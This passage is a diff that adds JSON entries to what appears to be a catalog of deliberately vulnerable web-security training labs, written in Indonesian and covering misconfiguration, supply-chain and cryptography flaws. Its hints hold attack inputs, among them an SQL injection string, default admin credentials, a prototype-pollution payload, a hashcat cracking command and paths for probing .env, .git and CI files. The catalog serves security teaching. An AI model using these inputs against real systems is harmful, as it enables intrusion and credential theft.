+        "Mode debug yang seharusnya cuma untuk development masih aktif di \"production\" - error yang tak tertangani menampilkan stack trace lengkap beserta connection string database.",
+        "Contoh: masukkan ID produk yang bukan angka untuk memicu error."
+      ],
+      "id": "a02-security-misconfiguration--misconfig--debug-stacktrace",
+      "category": "a02-security-misconfiguration",
+      "topic": "misconfig",
+      "source_lab_status": 200,
+      "source_order": 14,
+      "source_hints": [
+        "Lihat Hint Coba masukkan input yang bukan angka, misalnya abc atau 1' OR '1'='1 , ke kolom Product ID. Input numerik valid (mis. 1 , 2 , 3 ) akan lolos validasi dan hanya menampilkan hasil produk biasa."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "product_id"
+      ]
+    },
+    {
+      "title": "Kredensial default",
+      "paragraphs": [
+        "Kredensial admin/admin123 yang seharusnya diganti saat instalasi awal tidak pernah diubah."
+      ],
+      "id": "a02-security-misconfiguration--misconfig--default-credentials",
+      "category": "a02-security-misconfiguration",
+      "topic": "misconfig",
+      "source_lab_status": 200,
+      "source_order": 15,
+      "source_hints": [
+        "Lihat Hint Banyak aplikasi/perangkat datang dengan akun admin bawaan untuk setup awal —\nseringnya polanya sangat umum dan terdokumentasi publik (manual vendor, forum, dsb). Coba\nkredensial default yang paling umum untuk panel admin: admin / admin123 ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Directory listing aktif",
+      "paragraphs": [
+        "Options +Indexes aktif di folder backup/, membocorkan file .bak berisi dump database & config lama."
+      ],
+      "id": "a02-security-misconfiguration--misconfig--directory-listing",
+      "category": "a02-security-misconfiguration",
+      "topic": "misconfig",
+      "source_lab_status": 200,
+      "source_order": 16,
+      "source_hints": [
+        "Lihat Hint Klik link di atas (atau akses langsung /secmisconfig/backup/ dari\nbrowser). Apache akan menampilkan listing folder karena Options +Indexes aktif\nuntuk direktori ini. Buka setiap file yang muncul dan perhatikan isinya — file .sql.bak dan .php.bak sering berisi data sensitif yang seharusnya\ntidak pernah bisa diakses lewat browser."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Debug endpoint tertinggal di production",
+      "paragraphs": [
+        "Endpoint ala phpinfo() yang dipakai saat development tidak pernah dihapus/diproteksi sebelum deploy, dan tidak ditautkan di menu mana pun - cuma bisa diakses kalau tahu path-nya."
+      ],
+      "id": "a02-security-misconfiguration--misconfig--debug-endpoint",
+      "category": "a02-security-misconfiguration",
+      "topic": "misconfig",
+      "source_lab_status": 200,
+      "source_order": 17,
+      "source_hints": [
+        "Perhatikan: kredensial cloud ( AWS_SECRET_ACCESS_KEY ), kunci\npenandatanganan JWT, password database, dan secret key payment gateway semuanya terekspos di\nsatu halaman yang tidak dilindungi otentikasi apa pun."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "CORS misconfiguration",
+      "paragraphs": [
+        "Access-Control-Allow-Origin me-reflect header Origin apa pun dari request, dikombinasikan dengan Access-Control-Allow-Credentials: true - situs mana pun bisa membaca API ini pakai cookie korban."
+      ],
+      "id": "a02-security-misconfiguration--misconfig--cors-misconfig",
+      "category": "a02-security-misconfiguration",
+      "topic": "misconfig",
+      "source_lab_status": 200,
+      "source_order": 18,
+      "source_hints": [
+        "Lihat kode vulnerable $origin = $_SERVER['HTTP_ORIGIN']; header('Access-Control-Allow-Origin: ' . $origin); header('Access-Control-Allow-Credentials: true'); — server tidak pernah mengecek origin terhadap allowlist, hanya mengembalikan apa pun yang\ndikirim client."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Header keamanan hilang - Clickjacking",
+      "paragraphs": [
+        "Halaman \"transfer dana\" tidak mengirim X-Frame-Options maupun frame-ancestors, sehingga bisa ditumpangi lewat <iframe> transparan di halaman attacker untuk menjebak klik korban."
+      ],
+      "id": "a02-security-misconfiguration--misconfig--missing-headers-clickjacking",
+      "category": "a02-security-misconfiguration",
+      "topic": "misconfig",
+      "source_lab_status": 200,
+      "source_order": 19,
+      "source_hints": [
+        "Lihat Hint Buka halaman attacker (PoC) , lalu klik\ntombol \"Klaim Hadiah\" di sana (jangan submit form di halaman ini secara langsung). Setelah itu\nkembali ke halaman ini dan lihat tabel Log Transfer — kalau ada entri baru yang muncul padahal\nkamu tidak pernah benar-benar bermaksud menekan tombol \"Konfirmasi Transfer\", berarti clickjacking\nberhasil."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Folder .git ter-expose",
+      "paragraphs": [
+        "Subsite kecil di-deploy dengan menyalin folder kerja git apa adanya. Directory listing aktif di .git/, sehingga isinya bisa diunduh dan riwayat commit-nya dibaca dengan git log -p - termasuk file yang pernah di-commit lalu dihapus di commit berikutnya."
+      ],
+      "id": "a02-security-misconfiguration--exposed-vcs--git-exposed",
+      "category": "a02-security-misconfiguration",
+      "topic": "exposed-vcs",
+      "source_lab_status": 200,
+      "source_order": 20,
+      "source_hints": [
+        "Kenapa ini bisa terjadi Git menyimpan seluruh riwayat sebagai object yang di- content-address (hash) — menghapus file di commit baru cuma membuat snapshot baru tanpa file itu, bukan\nmenghapus object lamanya dari .git/objects/ . Selama folder .git bisa\ndiakses siapa saja, seluruh riwayat itu ikut bisa dibaca siapa saja juga — apa pun yang pernah\ndi-commit, walau cuma sesaat, harus dianggap bocor permanen (rotate credential-nya, jangan cuma\nhapus filenya)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "File .env ter-expose",
+      "paragraphs": [
+        "File .env ikut ter-deploy di root aplikasi, dan tidak ada aturan yang memblokir akses ke dotfile - kredensial production terbaca mentah-mentah lewat satu request."
+      ],
+      "id": "a02-security-misconfiguration--exposed-vcs--env-exposed",
+      "category": "a02-security-misconfiguration",
+      "topic": "exposed-vcs",
+      "source_lab_status": 200,
+      "source_order": 21,
+      "source_hints": [
+        "Kenapa ini terjadi Apache (dan banyak web server lain) secara default tidak memblokir akses ke file/folder berawalan titik kecuali dikonfigurasi eksplisit — mis. <FilesMatch \"^\\.\"> Require all denied </FilesMatch> . Developer yang\nterbiasa dengan framework yang otomatis menaruh .env di luar public/ /webroot (mis. Laravel) bisa lupa bahwa aturan itu tidak berlaku otomatis\nkalau deployment-nya manual/berbeda struktur."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Backup file editor yang bisa ditebak",
+      "paragraphs": [
+        "File seperti config.php.save tertinggal di webroot dari sesi edit langsung di server - karena ekstensinya bukan .php, isinya dikirim sebagai teks biasa, bukan dieksekusi."
+      ],
+      "id": "a02-security-misconfiguration--exposed-vcs--backup-file-guess",
+      "category": "a02-security-misconfiguration",
+      "topic": "exposed-vcs",
+      "source_lab_status": 200,
+      "source_order": 22,
+      "source_hints": [
+        "Kenapa ini berbahaya walau \"cuma nebak nama file\" Pola nama backup editor sangat terbatas dan dikenal luas — tidak butuh brute\nforce acak, cukup coba beberapa akhiran umum untuk setiap file penting yang sudah diketahui\nnamanya (mis. config.php , settings.php , wp-config.php ).\nScanner otomatis (Nikto, ffuf dengan wordlist) melakukan ini dalam hitungan detik."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Cookie tanpa flag HttpOnly",
+      "paragraphs": [
+        "Tanpa HttpOnly, bug XSS apa pun (sekecil apa pun) langsung bisa dipakai untuk mencuri cookie sesi lewat document.cookie."
+      ],
+      "id": "a02-security-misconfiguration--cookie-misconfig--missing-httponly",
+      "category": "a02-security-misconfiguration",
+      "topic": "cookie-misconfig",
+      "source_lab_status": 200,
+      "source_order": 23,
+      "source_hints": [
+        "Kenapa ini penting sebagai lapisan pertahanan terpisah HttpOnly tidak mencegah XSS terjadi — ini murni mitigasi dampak . Aplikasi tetap harus memperbaiki XSS-nya (lihat kategori XSS terpisah), tapi\nselama itu belum sempurna 100% di semua endpoint, HttpOnly adalah jaring pengaman\nmurah yang seharusnya selalu dipasang di setiap cookie sesi/autentikasi tanpa terkecuali."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Cookie tanpa flag Secure",
+      "paragraphs": [
+        "Tanpa Secure, tidak ada jaminan browser bahwa cookie ini hanya melintas lewat koneksi terenkripsi - satu titik akses HTTP yang lupa di-redirect cukup untuk membocorkannya ke penyadap jaringan."
+      ],
+      "id": "a02-security-misconfiguration--cookie-misconfig--missing-secure",
+      "category": "a02-security-misconfiguration",
+      "topic": "cookie-misconfig",
+      "source_lab_status": 200,
+      "source_order": 24,
+      "source_hints": [
+        "Kenapa flag ini tetap wajib walau \"aplikasinya sudah HTTPS semua\" Klaim \"semua endpoint sudah HTTPS\" susah dijamin benar 100% selamanya — subdomain\nbaru, service internal, atau konfigurasi load balancer yang berubah bisa diam-diam membuka jalur\nHTTP baru. Flag Secure membuat browser sendiri yang menegakkan aturan \"jangan pernah\nkirim cookie ini lewat HTTP\", terlepas dari kesalahan konfigurasi di sisi manapun."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Cookie tanpa atribut SameSite",
+      "paragraphs": [
+        "Browser modern menerapkan default Lax diam-diam, tapi browser lama/WebView tetap memperlakukan cookie ini sebagai None - dikirim di semua request lintas situs."
+      ],
+      "id": "a02-security-misconfiguration--cookie-misconfig--missing-samesite",
+      "category": "a02-security-misconfiguration",
+      "topic": "cookie-misconfig",
+      "source_lab_status": 200,
+      "source_order": 25,
+      "source_hints": [
+        "Bedanya dengan lab CSRF di kategori Broken Access Control Lab CSRF di kategori lain fokus ke validasi token yang hilang/bisa\ndi-bypass. Lab ini fokus ke lapisan pertahanan yang berbeda & independen: atribut cookie itu\nsendiri yang menentukan apakah cookie ikut terkirim sama sekali di request lintas situs.\nIdealnya kedua lapisan ini dipasang bersamaan (defense in depth) — token CSRF yang valid dan cookie yang secara eksplisit di-scope dengan SameSite=Strict atau Lax ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "HTTP method TRACE aktif (XST)",
+      "paragraphs": [
+        "Default aman TraceEnable Off dari image dasar sengaja dibalik jadi On - request TRACE mendapat balasan berisi persis header yang dikirim, celah historis untuk melewati proteksi HttpOnly (Cross-Site Tracing)."
+      ],
+      "id": "a02-security-misconfiguration--http-methods--trace-method",
+      "category": "a02-security-misconfiguration",
+      "topic": "http-methods",
+      "source_lab_status": 200,
+      "source_order": 26,
+      "source_hints": [
+        "Mitigasi Pastikan TraceEnable Off tetap terpasang di konfigurasi Apache (atau\nmodul/direktif setara di web server lain) — jangan mengaktifkannya kembali untuk keperluan\ndebugging sementara tanpa mematikannya lagi setelah selesai. Auditor sebaiknya tetap memverifikasi\nlangsung lewat curl -X TRACE , karena konfigurasi eksplisit seperti ini bisa saja\nmenimpa default aman yang sudah disediakan distribusi/image dasar."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "HTTP method PUT diterima tanpa validasi",
+      "paragraphs": [
+        "Endpoint memproses method PUT dan menyimpan body request apa adanya tanpa validasi ekstensi/isi/autentikasi - webshell bisa ditanam tanpa pernah menyentuh form upload aplikasi."
+      ],
+      "id": "a02-security-misconfiguration--http-methods--put-method",
+      "category": "a02-security-misconfiguration",
+      "topic": "http-methods",
+      "source_lab_status": 200,
+      "source_order": 27,
+      "source_hints": [
+        "Kenapa ini terjadi Banyak developer hanya memikirkan validasi upload di level form aplikasi (lihat kategori File Upload) dan lupa bahwa web server/handler PHP-nya sendiri bisa menerima\nmethod HTTP lain yang punya efek serupa. <LimitExcept GET POST>...</LimitExcept> di konfigurasi Apache seharusnya membatasi method yang diterima per endpoint, tapi ini sering\ntidak pernah dipasang karena secara default PHP tetap memproses request PUT/DELETE/dst yang\nsampai ke script-nya."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Prototype Pollution di utility library lama",
+      "paragraphs": [
+        "Mensimulasikan CVE-2018-3721 (lodash merge() versi lama) - JSON dari user di-deep-merge tanpa memblokir kunci __proto__, sehingga bisa mempolusi Object.prototype dan mempengaruhi objek lain di halaman.",
+        "Contoh payload: {\"__proto__\":{\"isAdmin\":true}}"
+      ],
+      "id": "a03-software-supply-chain-failures--supply-chain--prototype-pollution",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "supply-chain",
+      "source_lab_status": 200,
+      "source_order": 28,
+      "source_hints": [
+        "Lihat Hint Goal: halaman ini memuat utilitas \"merge/extend\" bergaya library populer\n(mensimulasikan lodash merge() versi lama, sebelum 4.17.5 — CVE-2018-3721 ) yang deep-merge dua object secara rekursif TANPA memblokir key\nistimewa seperti __proto__ . Kalau kamu bisa membuat aplikasi men- deep-merge JSON yang kamu kontrol ke dalam object apa pun, kamu bisa menambahkan properti ke Object.prototype — dan properti itu otomatis \"muncul\" di SEMUA object polos {} di seluruh halaman (bahkan yang belum pernah dibuat saat payload dikirim). Coba payload ini di kotak merge di bawah, lalu klik \"Terapkan Merge\": {\"__proto__\":{\"isAdmin\":true}} Perhatikan panel \"Admin\" di bawah — sebelumnya terkunci, dan dicek dengan\ncara yang sepertinya tidak berhubungan sama sekali dengan form merge di atas."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Dependency confusion",
+      "paragraphs": [
+        "Build internal fallback ke registry publik kalau nama package tidak ditemukan di registry internal - attacker yang tahu nama package internal (bocor lewat file config) bisa publish package publik bernama sama supaya kodenya ikut \"terinstall\" saat build berikutnya."
+      ],
+      "id": "a03-software-supply-chain-failures--supply-chain--dependency-confusion",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "supply-chain",
+      "source_lab_status": 200,
+      "source_order": 29,
+      "source_hints": [
+        "Lihat Hint Goal: proses \"Internal Build\" di halaman ini mengambil beberapa dependency.\nSebagian nama dependency itu HANYA dipakai secara internal, tapi nama-namanya sendiri kadang\nbocor lewat file konfigurasi yang tidak sengaja ikut ter-deploy ke webroot publik (manifest\nbuild, package config, dsb). Coba jelajahi webroot aplikasi ini untuk menemukan file semacam itu\n— misalnya coba akses /internal-package-registry.json langsung. Setelah tahu nama dependency internalnya, publikasikan paket PUBLIK dengan nama\nyang PERSIS SAMA lewat form \"Publish ke Public Registry\" di bawah (isi apa saja, mis. system('id') sebagai simulasi payload). Lalu klik \"Jalankan Internal Build\" dan\nlihat apa yang terjadi."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "action",
+        "pkg_name",
+        "pkg_code"
+      ]
+    },
+    {
+      "title": "Secret CI/CD ter-expose",
+      "paragraphs": [
+        "File workflow CI/CD (mis. deploy.yml) yang seharusnya hanya ada di repo Git malah ikut ter-deploy ke webroot, membocorkan token deploy production dalam bentuk plaintext."
+      ],
+      "id": "a03-software-supply-chain-failures--supply-chain--cicd-secret-exposure",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "supply-chain",
+      "source_lab_status": 200,
+      "source_order": 30,
+      "source_hints": [
+        "Lihat Hint Goal: form di bawah ini mensimulasikan API internal https://deploy.acme-corp.internal/api/deploy — siapa pun yang punya token\nBearer yang valid bisa memicu deploy ke production. Masalahnya, file konfigurasi pipeline CI/CD\nkadang tidak sengaja ikut ter- deploy ke webroot publik (bukan cuma tersimpan di\nrepository/CI server), lengkap dengan secret yang di-hardcode di dalamnya. Coba akses langsung /deploy.yml pada aplikasi ini. File semacam ini\n(workflow CI, .gitlab-ci.yml , Jenkinsfile , dsb) adalah target umum\nuntuk dicoba path-guessing di webroot mana pun."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "token"
+      ]
+    },
+    {
+      "title": "Auto-update tanpa verifikasi",
+      "paragraphs": [
+        "Mekanisme auto-update mengambil paket dari sumber yang diberikan tanpa memverifikasi keasliannya - paket resmi maupun paket yang sudah dimanipulasi diperlakukan sama persis."
+      ],
+      "id": "a03-software-supply-chain-failures--supply-chain--unsigned-autoupdate",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "supply-chain",
+      "source_lab_status": 200,
+      "source_order": 31,
+      "source_hints": [
+        "Lihat Hint Goal: fitur auto-update plugin di bawah ini mengambil \"paket update\" dari URL\nyang diberikan admin, lalu langsung menerapkannya — TANPA pernah memverifikasi\nsignature/checksum apa pun. Aplikasi tidak punya cara membedakan paket resmi dari vendor dengan\npaket yang sudah dimodifikasi/disusupi. Sudah disiapkan dua contoh \"paket\" untuk dicoba (offline, tanpa perlu internet): ?paket_url=data/official_update.txt — paket resmi yang legit. ?paket_url=data/tampered_update.txt — paket yang sudah ditampering /\n  disusupi penyerang, tapi strukturnya dibuat terlihat sama persis dengan yang resmi. Perhatikan: KEDUANYA diterima dan \"diterapkan\" begitu saja oleh aplikasi, dengan\nrespons sukses yang sama. Itulah bug-nya — tidak ada pengecekan apa pun yang membedakan\nkeduanya."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "paket_url"
+      ]
+    },
+    {
+      "title": "Typosquatting",
+      "paragraphs": [
+        "Nama paket lookalike (satu-dua karakter berbeda, mis. huruf l diganti I kapital) terdaftar di registry publik - korban ter-install paket yang salah karena copy-paste command tanpa mengecek ulang."
+      ],
+      "id": "a03-software-supply-chain-failures--malicious-package-content--typosquatting",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "malicious-package-content",
+      "source_lab_status": 200,
+      "source_order": 33,
+      "source_hints": [
+        "Lihat Hint Goal: cari & \"install\" package HTTP client resmi tim Platform Corp lewat form\npencarian di bawah. Perhatikan baik-baik SETIAP karakter di nama paket sebelum menekan Install -\nada dua paket lookalike di katalog ini yang sengaja dibuat nyaris tidak bisa dibedakan sekilas\ndari yang asli."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "pkg_name"
+      ]
+    },
+    {
+      "title": "Missing Subresource Integrity (SRI)",
+      "paragraphs": [
+        "Tanpa atribut integrity, browser menjalankan apa pun isi skrip yang diterima dari CDN eksternal tanpa verifikasi - kalau CDN-nya disusupi, skrip yang sudah dimodifikasi tetap jalan penuh."
+      ],
+      "id": "a03-software-supply-chain-failures--malicious-package-content--missing-sri",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "malicious-package-content",
+      "source_lab_status": 200,
+      "source_order": 34,
+      "source_hints": [
+        "Lihat Hint Goal: halaman ini memuat skrip pihak ketiga (simulasi CDN eksternal) dua kali\n— satu tanpa atribut integrity , satu lagi dengan atribut integrity yang benar. Kedua tag <script> menunjuk ke file YANG SAMA, yaitu versi yang\nsudah \"ditampering\" (mensimulasikan CDN yang disusupi attacker setelah developer pertama kali\nmemasang tag script-nya). Buka DevTools → tab Console setelah reload untuk melihat\nperbedaannya.",
+        "Cara menghitung hash integrity sendiri openssl dgst -sha384 -binary cdn_analytics_legit.js | openssl base64 -A Perintah ini persis algoritma yang dipakai browser untuk memverifikasi atribut integrity (SHA-256/384/512, di-encode base64, diawali sha384- )."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Lockfile diabaikan saat build",
+      "paragraphs": [
+        "Lockfile mengunci dependency ke versi & hash yang sudah direview, tapi build yang tidak memakai mode \"frozen\" bisa diam-diam mengambil versi lebih baru yang belum direview (dan sudah disusupi)."
+      ],
+      "id": "a03-software-supply-chain-failures--malicious-package-content--lockfile-ignored",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "malicious-package-content",
+      "source_lab_status": 200,
+      "source_order": 35,
+      "source_hints": [
+        "Lihat Hint Goal: bandingkan hasil dua cara menjalankan \"build\" yang sama-sama umum dipakai\ntim development. Perhatikan versi paket & apa yang benar-benar terjadi di masing-masing log."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "mode"
+      ]
+    },
+    {
+      "title": "CI Action dipin ke tag mutable",
+      "paragraphs": [
+        "Tag @v1 pada Action CI/CD pihak ketiga bisa dipindah kapan saja oleh maintainer atau attacker yang membajak repo-nya - workflow yang pin ke tag otomatis menjalankan apa pun yang sedang ditunjuknya."
+      ],
+      "id": "a03-software-supply-chain-failures--unpinned-build-references--ci-action-mutable-tag",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "unpinned-build-references",
+      "source_lab_status": 200,
+      "source_order": 36,
+      "source_hints": [
+        "Lihat Hint Goal: pahami kenapa workflow yang mem-pin third-party Action ke tag mutable\n( @v1 ) rentan dibanding yang mem-pin ke commit SHA. Coba \"ambil alih\" tag v1 lewat form di bawah (mensimulasikan akun maintainer action tersebut yang disusupi), lalu\njalankan kedua workflow dan bandingkan hasilnya."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "action"
+      ]
+    },
+    {
+      "title": "Container base image dipin ke tag mutable",
+      "paragraphs": [
+        "Sama seperti Action CI/CD, tag image container bisa dipindah ke digest lain kapan saja oleh siapa pun yang punya akses push ke registry - build yang pin ke tag mewarisi apa pun yang sedang ditunjuknya."
+      ],
+      "id": "a03-software-supply-chain-failures--unpinned-build-references--mutable-base-image",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "unpinned-build-references",
+      "source_lab_status": 200,
+      "source_order": 37,
+      "source_hints": [
+        "Lihat Hint Goal: sama seperti Lab 9, tapi konteksnya container image, bukan CI Action —\nprinsipnya identik: referensi mutable (tag) vs referensi immutable (digest).\n\"Push\" image baru ke tag :latest lewat form di bawah, lalu bandingkan hasil build\ndua Dockerfile."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "action"
+      ]
+    },
+    {
+      "title": "Penyimpanan password plaintext",
+      "paragraphs": [
+        "Tidak ada transformasi kriptografi apa pun antara input password dan yang disimpan di database."
+      ],
+      "id": "a04-cryptographic-failures--weak-hashing--plaintext",
+      "category": "a04-cryptographic-failures",
+      "topic": "weak-hashing",
+      "source_lab_status": 200,
+      "source_order": 38,
+      "source_hints": [
+        "Lihat Hint Goal: bayangkan tabel di bawah ini adalah hasil dump database (mis. lewat SQL\nInjection, backup yang bocor, atau insider threat) dari aplikasi \"VulnShop\". Karena password\ndisimpan apa adanya (bukan hash), begitu database bocor, seluruh password akun\nlangsung diketahui tanpa perlu cracking sama sekali."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Hash MD5 tanpa salt",
+      "paragraphs": [
+        "MD5 didesain cepat dihitung (untuk checksum, bukan password) - tanpa salt, hash yang bocor bisa dicocokkan lewat lookup table online atau hashcat -m 0."
+      ],
+      "id": "a04-cryptographic-failures--weak-hashing--unsalted-md5",
+      "category": "a04-cryptographic-failures",
+      "topic": "weak-hashing",
+      "source_lab_status": 200,
+      "source_order": 39,
+      "source_hints": [
+        "Lihat Hint Goal: hash di bawah ini dibuat dengan md5($password) — tanpa\nsalt, tanpa iterasi (bukan bcrypt/Argon2). MD5 didesain untuk cepat dihitung (awalnya\nuntuk checksum, bukan password), dan tanpa salt, hash yang sama akan selalu dihasilkan dari\npassword yang sama di akun mana pun — inilah kenapa rainbow table /lookup table\nonline (mis. CrackStation) bisa membalikkan MD5 dalam hitungan detik untuk password umum.\nTool \"crack\" sederhana di bawah mensimulasikan dictionary attack: masukkan daftar kata sandi\nyang mungkin (satu per baris), server menghitung MD5 tiap kandidat lalu membandingkannya dengan\nhash yang bocor. Di dunia nyata, gunakan hashcat -m 0 hashes.txt rockyou.txt (mode 0\n= raw MD5) untuk mencoba jutaan kandidat per detik."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "wordlist"
+      ]
+    },
+    {
+      "title": "\"Enkripsi\" yang sebenarnya cuma encoding",
+      "paragraphs": [
+        "base64 adalah encoding (bisa dibalik siapa saja tanpa kunci apa pun), bukan enkripsi. Menamai variabelnya \"encrypted\" tidak mengubah sifat matematisnya."
+      ],
+      "id": "a04-cryptographic-failures--weak-hashing--reversible-encoding",
+      "category": "a04-cryptographic-failures",
+      "topic": "weak-hashing",
+      "source_lab_status": 200,
+      "source_order": 40,
+      "source_hints": [
+        "Lihat Hint Goal: fitur \"remember me\" di bawah menyimpan kredensial ke cookie lewat fungsi\nyang di kode sumbernya dinamai $encrypted_credentials — developer mengira ini\nenkripsi. Padahal isinya cuma base64_encode(\"username:password\") : tidak ada kunci\nrahasia, tidak ada algoritma kriptografi apa pun, murni encoding yang bisa dibalik siapa saja.\nLogin di bawah, lalu lihat nilai cookie remember_me di DevTools → Application\n→ Cookies, dan decode base64-nya (browser console: atob(\"...\") , atau situs\nbase64 decoder mana pun)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "API key sekuensial",
+      "paragraphs": [
+        "Menaikkan satu angka dari API key sendiri langsung menemukan API key user lain."
+      ],
+      "id": "a04-cryptographic-failures--insecure-randomness--sequential-api-key",
+      "category": "a04-cryptographic-failures",
+      "topic": "insecure-randomness",
+      "source_lab_status": 200,
+      "source_order": 42,
+      "source_hints": [
+        "Lihat Hint Goal: API key kamu adalah 1042 — ini cuma nilai AUTO_INCREMENT biasa dari database, bukan token acak. Coba naikkan/turunkan angkanya\nuntuk menemukan API key milik user lain."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "key"
+      ]
+    },
+    {
+      "title": "OTP 2FA bisa diprediksi",
+      "paragraphs": [
+        "mt_rand() bukan CSPRNG - kalau seed-nya (waktu generate) diketahui, seluruh output bisa dihitung ulang persis sama."
+      ],
+      "id": "a04-cryptographic-failures--insecure-randomness--predictable-otp",
+      "category": "a04-cryptographic-failures",
+      "topic": "insecure-randomness",
+      "source_lab_status": 200,
+      "source_order": 43,
+      "source_hints": [
+        "Lihat Hint Goal: OTP dibuat dengan mt_srand($timestamp); mt_rand(100000, 999999); . mt_rand() memakai algoritma Mersenne Twister yang cepat tapi tidak aman secara kriptografis (bukan CSPRNG) — kalau seed-nya (di sini: waktu generate) diketahui,\nseluruh output bisa dihitung ulang persis sama. Sama seperti Lab 1, waktu generate bocor lewat\nheader Date di response HTTP (ditampilkan langsung di sini untuk latihan). Gunakan\ntool \"Predict OTP\" di bawah dengan timestamp itu."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "predict_ts",
+        "otp"
+      ]
+    },
+    {
+      "title": "Kode kupon bisa ditebak",
+      "paragraphs": [
+        "\"Kode unik\" ternyata cuma representasi ulang nomor order yang sekuensial, tanpa komponen acak sama sekali."
+      ],
+      "id": "a04-cryptographic-failures--insecure-randomness--predictable-coupon",
+      "category": "a04-cryptographic-failures",
+      "topic": "insecure-randomness",
+      "source_lab_status": 200,
+      "source_order": 44,
+      "source_hints": [
+        "Lihat Hint Goal: kupon dibuat dari 'SAVE' . str_pad($order_id, 4, '0', STR_PAD_LEFT) — bukan kode acak, cuma nomor order yang diformat ulang. Lakukan satu kali \"checkout\" untuk\nmelihat pola kuponmu sendiri (mis. SAVE1001 ), lalu tebak kode order lain di\nsekitarnya ( SAVE1000 , SAVE1002 , dst.) dan coba redeem."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "coupon_code"
+      ]
+    },
+    {
+      "title": "Data sensitif di URL",
+      "paragraphs": [
+        "Browser mengirim URL lengkap (termasuk query string) sebagai Referer ke resource pihak ketiga mana pun yang dimuat halaman."
+      ],
+      "id": "a04-cryptographic-failures--sensitive-data-exposure--url-leak",
+      "category": "a04-cryptographic-failures",
+      "topic": "sensitive-data-exposure",
+      "source_lab_status": 200,
+      "source_order": 45,
+      "source_hints": [
